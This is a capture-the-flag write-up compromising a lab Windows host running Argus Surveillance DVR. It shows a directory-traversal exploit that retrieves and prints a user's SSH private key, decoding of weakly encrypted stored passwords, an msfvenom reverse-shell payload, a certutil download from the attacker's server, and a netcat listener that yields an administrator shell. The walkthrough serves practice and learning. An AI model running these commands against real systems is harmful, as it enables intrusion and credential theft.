# CTF Writeup: DRV4

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.210.179
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 15:19 EST
Nmap scan report for 192.168.210.179
Host is up (0.023s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
|_http-title: Argus Surveillance DVR
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=11/8%Time=690FA5DB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKe
SF:ep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nCont
SF:ent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Surve
SF:illance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\
SF:x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GEN
SF:ERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft
SF:\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20
SF:border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x2
SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTo
SF:pFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\
SF:x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrollin
SF:g=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"
SF:0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasB
SF:ottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\
SF:r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fra
SF:mes,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\
SF:x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nCon
SF:nection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nConten
SF:t-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\
SF:r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20
SF:http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859
SF:-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x20
SF:6\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frames
SF:et\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\
SF:x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
SF:0noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20marg
SF:inheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20f
SF:rameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFra
SF:me\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<fram
SF:e\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x
SF:20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20
SF:marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p
SF:>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x
SF:20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/8%OT=22%CT=1%CU=44072%PV=Y%DS=4%DC=T%G=Y%TM=690FA69
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=1
OS:02%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=108%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-08T20:22:27
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   21.03 ms 192.168.45.1
2   20.98 ms 192.168.45.254
3   21.05 ms 192.168.251.1
4   21.13 ms 192.168.210.179

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.32 seconds
```

Analyzed the webpage running port 8080, It is running an camera management application called "Argus Surveillance". I was able to change the password of the Administrator user. Administrator:password

Searched up for public exploit's 

```
searchsploit Argus                   
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                             | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                          | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                           | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                          | windows_x86/local/45312.c
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Found an Directory Traversal Vulnerability, let's exploit it!

Utilized following Exploit for CVE-2018-15745

```
git clone https://github.com/Jasurbek-Masimov/CVE-2018-15745.git
```

Gave the exploit.sh executable rights.

```
chmod +x exploit.sh
```

Ran the exploit and retrieved the private ssh key for user "Viewer".


```
./exploit.sh

▄▖          ▄▖        ▘▜ ▜           ▄ ▖▖▄▖▖▖
▌▌▛▘▛▌▌▌▛▘  ▚ ▌▌▛▘▌▌█▌▌▐ ▐ ▀▌▛▌▛▘█▌  ▌▌▌▌▙▘▙▌
▛▌▌ ▙▌▙▌▄▌  ▄▌▙▌▌ ▚▘▙▖▌▐▖▐▖█▌▌▌▙▖▙▖  ▙▘▚▘▌▌ ▌
    ▄▌                                       

Enter Target-Host IP Address
192.168.210.179
Enter Target-Host Port: 
8080
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Users\Viewer\.ssh\id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Saved the openssh private key inside an id_rsa file and configured the perms properly, so we can access the server with ssh.

```
chmod 600 id_rsa
```

## Initial Access

Gained Access as user "Viewer"

```
ssh -i id_rsa Viewer@192.168.210.179
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>
```

Retrieved local.txt in C:\Users\viewer\Desktop

```
51fe07202927a3b79c51fae58c41b794
```

Earlier we also found an Weak Password Encryption Exploit. Let's try and analyse it!

The exploit suggests that we can find an password file in C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

Retrieved password.

```
C:\ProgramData\PY_Software\Argus Surveillance DVR>type DVRParams.ini                                                             
[Main]                                                                                                                           
ServerName=                                                                                                                      
ServerLocation=                                                                                                                  
ServerDescription=                                                                                                               
ReadH=0                                                                                                                          
UseDialUp=0                                                                                                                      
DialUpConName=                                                                                                                   
DialUpDisconnectWhenDone=0                                                                                                       
DialUpUseDefaults=1                                                                                                              
DialUpUserName=                                                                                                                  
DialUpPassword=                                                                                                                  
DialUpDomain=                                                                                                                    
DialUpPhone=                                                                                                                     
ConnectCameraAtStartup=1                                                                                                         
ConnectSessionFile=Argus Surveillance DVR.DVRSes                                                                                 
StartAsService=1                                                                                                                 
RunPreviewAtStartup=1                                                                                                            
FullScreenAtStartup=0                                                                                                            
GalleryFolder=C:\ProgramData\PY_Software\Argus Surveillance DVR\Gallery\                                                         
RecordEncryptionPassword=                                                                                                        
RecordFrameInterval=200                                                                                                          
RecordMaxFileSize=0                                                                                                              
RecordEncryption=0                                                                                                               
RecordAllTime=0                                                                                                                  
RecordSound=1                                                                                                                    
RecordMotion=1                                                                                                                   
RecordCamName=1                                                                                                                  
RecordCamLocation=1                                                                                                              
RecordCamDescript=1                                                                                                              
HTTP_AlwaysActive=1                                                                                                              
HTTP_Port=8080                                                                                                                   
HTTP_Interval=100                                                                                                                
HTTP_LimitViewers=0                                                                                                              
HTTP_NeedAuthorization=0                                                                                                         
HTTP_NeedLocalAuthorization=0                                                                                                    
HTTP_MaxNumberOfViewers=100                                                                                                      
HTTP_AudioEnabled=1                                                                                                              
HTTP_StreamEnabled=1                                                                                                             
HTTP_EncriptionType=0                                                                                                            
HTTP_VideoBitRate=204800                                                                                                         
HTTP_DisconnectInactiveUsers=0                                                                                                   
HTTP_MaxInactivityTime=0                                                                                                         
HTTP_MaxConnectionMinutes=0                                                                                                      
HTTP_ReconnectAgain=0                                                                                                            
WriteHTTPLog=1                                                                                                                   
WriteMotionLog=1                                                                                                                 
WriteEventsLog=1                                                                                                                 
LimitMaxSizeOfLogFile=1                                                                                                          
MaxSizeOfLogFile=10000                                                                                                           
UseRedirect=0                                                                                                                    
UseWebMonitoring=0                                                                                                               
PYSoftAccountEmail=                                                                                                              
PYSoftAccountPsw=                                                                                                                
AskLoginAtStartup=0                                                                                                              
TaskTrayPassword=                                                                                                                
StealthMode=0                                                                                                                    
AskForConfirmationOnExit=0                                                                                                       
Watchdog_PollingIntrvl=20                                                                                                        
Watchdog_RestartProgramPolls=20                                                                                                  
Watchdog_Reboot=0                                                                                                                
Watchdog_RebootTries=20                                                                                                          
Watchdog_RebootPeriodically=1                                                                                                    
Watchdog_RebootPeriodclType=1                                                                                                    
Watchdog_RebootInterval=1                                                                                                        
Watchdog_Hours=24                                                                                                                
Watchdog_Days=1                                                                                                                  
Watchdog_DayOfWeek=0                                                                                                             
Watchdog_Month=1                                                                                                                 
Watchdog_RebootIfCPU=0                                                                                                           
Watchdog_RebootIfCPUType=0                                                                                                       
Watchdog_CPU=98                                                                                                                  
Watchdog_RebootIfCPUPolls=20                                                                                                     
Watchdog_IsRemoteAccess=0                                                                                                        
Watchdog_AccessPort=10000                                                                                                        
Watchdog_AccessID=                                                                                                               
Watchdog_AccessPsw=                                                                                                              
DynIPNextConnectTime0=0                                                                                                          
DynIPNextConnectTime1=0                                                                                                          
MonitorNextConnectTime0=0                                                                                                        
MonitorNextConnectTime1=0                                                                                                        
SMSNextConnectTime0=0                                                                                                            
SMSNextConnectTime1=0                                                                                                            
UseScreenSaver=0                                                                                                                 
ScreenSaveTimeOut=5                                                                                                              
MaxFileSize=2048                                                                                                                 
StreamToWeb=0                                                                                                                    
WebPageBackColor=16767949                                                                                                        
WebPageTextColor=0                                                                                                               
WebPageLinkColor=0                                                                                                               
WebPageActiveLnkColor=0                                                                                                          
WebPageVisitedLnkColor=0                                                                                                         
WebPageActiveXColor=0                                                                                                            
PreviewByOCX=1                                                                                                                   
ReduceCPUUsage=1                                                                                                                 
MaximumCPUUsage=95                                                                                                               
ActionsAllTime=0                                                                                                                 
DetectMotion=0                                                                                                                   
DetectionInterval=500                                                                                                            
MotionDetectionDelay=1000                                                                                                        
DifferencesThreshold=5                                                                                                           
MotionDifSensitivity=0                                                                                                           
MotionDontTriggerIfMuch=0                                                                                                        
MotionDontTriggerTrshld=90                                                                                                       
MotionSensitivityCnst=90                                                                                                         
MotionSensitivity1=30                                                                                                            
MotionSensitivity2=21                                                                                                            
MotionSensitivity3=17                                                                                                            
MotionSensitivity4=15                                                                                                            
MotionSensitivity5=15                                                                                                            
MotionSensitivity6=17                                                                                                            
MotionSensitivity7=21                                                                                                            
MotionSensitivity8=30                                                                                                            
MotionMinActionDuration=2000                                                                                                     
MotionSendEmail=0                                                                                                                
EmailUsePysoftMailServer=0                                                                                                       
MotionEmailServer=                                                                                                               
MotionEmailNeedPassword=0                                                                                                        
MotionEmailAccountName=                                                                                                          
MotionEmailPassword=                                                                                                             
MotionEmailSMTPPort=25                                                                                                           
MotionEmailSender=                                                                                                               
MotionEmailAddress=                                                                                                              
MotionEmailSubject=4D6F74696F6E207B4D4F54494F4E7D2520686173206265656E206465746563746564212121                                    
MotionEmailMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D
6F74696F6E20696E20746865207761746368656420617265612E                                                                             
MotionEmailInterval=20                                                                                                           
MotionEmailAttachImage=1                                                                                                         
MotionEmailNumberOfImages=3                                                                                                      
MotionEmailPriority=1                                                                                                            
FacesDetect=0                                                                                                                    
FacesHighlight=1                                                                                                                 
FaceDetectSensitivityInPercents=50                                                                                               
FaceDetecMinFaceInPercents=10                                                                                                    
MotionPlaySound=0                                                                                                                
MotionSoundFile=                                                                                                                 
MotionLanchApplication=0                                                                                                         
MotionApplicationFile=                                                                                                           
MotionRecordVideo=0                                                                                                              
MotionVideoDuration=120                                                                                                          
MotionPreVideoDuration=2                                                                                                         
MotionWriteSnapshots=0                                                                                                           
MotionSnapshotDuration=10                                                                                                        
MotionChangeSettings=0                                                                                                           
MotionImageQuality=70                                                                                                            
MotionSoundQuality=70                                                                                                            
MotionRecordInterval=133                                                                                                         
MotionChangeSettingsDuration=10                                                                                                  
MotionDrawMotionValue=0                                                                                                          
MotionHighlightMoving=0                                                                                                          
SendSMS=0                                                                                                                        
SMSSender=                                                                                                                       
SMSPhone=                                                                                                                        
SMSMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F
6E20696E20746865207761746368656420617265612E                                                                                     
RemoveObsoleteFiles=1                                                                                                            
DaysToDeleteObsoleteFiles=7                                                                                                      
LastReadNetCamsListDay=45969                                                                                                     
                                                                                                                                 
[Users]                                                                                                                          
LocalUsersCount=2                                                                                                                
UserID0=434499                                                                                                                   
LoginName0=Administrator                                                                                                         
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB74
0CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083                                                                                
FullControl0=1                                                                                                                   
CanClose0=1                                                                                                                      
CanPlayback0=1                                                                                                                   
CanPTZ0=1                                                                                                                        
CanRecord0=1                                                                                                                     
CanConnect0=1                                                                                                                    
CanReceiveAlerts0=1                                                                                                              
CanViewLogs0=1                                                                                                                   
CanViewCamerasNumber0=0                                                                                                          
CannotBeRemoved0=1                                                                                                               
MaxConnectionTimeInMins0=0                                                                                                       
DailyTimeLimitInMins0=0                                                                                                          
MonthlyTimeLimitInMins0=0                                                                                                        
DailyTrafficLimitInKB0=0                                                                                                         
MonthlyTrafficLimitInKB0=0                                                                                                       
MaxStreams0=0                                                                                                                    
MaxViewers0=0                                                                                                                    
MaximumBitrateInKb0=0                                                                                                            
AccessFromIPsOnly0=                                                                                                              
AccessRestrictedForIPs0=                                                                                                         
MaxBytesSent0=0                                                                                                                  
Password0=7196F64190839083C1658998CA79418D                                                                                       
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03B
B740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083                                                                             
Disabled0=0                                                                                                                      
ExpirationDate0=0                                                                                                                
Organization0=                                                                                                                   
OrganizationUnit0=                                                                                                               
Phone10=                                                                                                                         
Phone20=                                                                                                                         
Fax0=                                                                                                                            
Email0=                                                                                                                          
Position0=                                                                                                                       
Address10=                                                                                                                       
Address20=                                                                                                                       
City0=                                                                                                                           
StateProvince0=                                                                                                                  
ZipPostalCode0=                                                                                                                  
Country0=                                                                                                                        
ComputerID0=                                                                                                                     
TrialAccount0=0                                                                                                                  
UserID1=576846                                                                                                                   
LoginName1=Viewer                                                                                                                
FullName1=                                                                                                                       
FullControl1=1                                                                                                                   
CanClose1=1                                                                                                                      
CanPlayback1=1                                                                                                                   
CanPTZ1=1                                                                                                                        
CanRecord1=1                                                                                                                     
CanConnect1=1                                                                                                                    
CanReceiveAlerts1=1                                                                                                              
CanViewLogs1=1                                                                                                                   
CanViewCamerasNumber1=0                                                                                                          
CannotBeRemoved1=0                                                                                                               
MaxConnectionTimeInMins1=0                                                                                                       
DailyTimeLimitInMins1=0                                                                                                          
MonthlyTimeLimitInMins1=0                                                                                                        
DailyTrafficLimitInKB1=0                                                                                                         
MonthlyTrafficLimitInKB1=0                                                                                                       
MaxStreams1=0                                                                                                                    
MaxViewers1=0                                                                                                                    
MaximumBitrateInKb1=0                                                                                                            
AccessFromIPsOnly1=                                                                                                              
AccessRestrictedForIPs1=                                                                                                         
MaxBytesSent1=0                                                                                                                  
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE                                                                   
Description1=                                                                                                                    
Disabled1=0                                                                                                                      
ExpirationDate1=0                                                                                                                
Organization1=                                                                                                                   
OrganizationUnit1=                                                                                                               
Phone11=                                                                                                                         
Phone21=                                                                                                                         
Fax1=                                                                                                                            
Email1=                                                                                                                          
Position1=                                                                                                                       
Address11=                                                                                                                       
Address21=                                                                                                                       
City1=                                                                                                                           
StateProvince1=                                                                                                                  
ZipPostalCode1=                                                                                                                  
Country1=                                                                                                                        
ComputerID1=                                                                                                                     
TrialAccount1=0
```

Downloaded the exploit locally.

We have to modify the exploit, so the password we retrieved is inside the exploit and get's decoded.

```
python3 50130.py
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Windows/DRV4/50130.py:30: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

The decrypted password is: 14WatchD0g
the last character is filtered as "Unknown", I'm assuming the last character is an special character, let's try to guess some. --> 14WatchD0g$ actually worked!

Let's try and login to ssh, but this didn't work.

We can also utilize runas.exe with Administrator to run an reverse shell as Administrator user.

Let's therefore create an revers shell payload and upload it to the target machine.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Launched an python server.

```
python3 -m http.server 80
```

Downloaded the shell.exe onto the target system.

```
C:\Temp>certutil -urlcache -split -f http://192.168.45.166/shell.exe shell.exe                                                   
****  Online  ****                                                                                                               
  0000  ...                                                                                                                      
  1c00                                                                                                                           
CertUtil: -URLCache command completed successfully.
```

Let's utilize runas.exe in order to execute our shell.exe as SYSTEM.

Before doing so, let's start out listener on port 1337.

```
nc -lvnp 1337
```

Executed shell.exe as Administrator user.

```
C:\Temp>runas /user:Administrator shell.exe                                                                                      
Enter the password for Administrator:                                                                                            
Attempting to start shell.exe as user "DVR4\Administrator" ...
```

Gained RCE as Administrator.

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.210.179] 49948
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
dvr4\administrator
```

Retrieved proof.txt in C:\User\Administrator\Desktop

```
47daaaf74ebccf735cb495ad50ded111
```
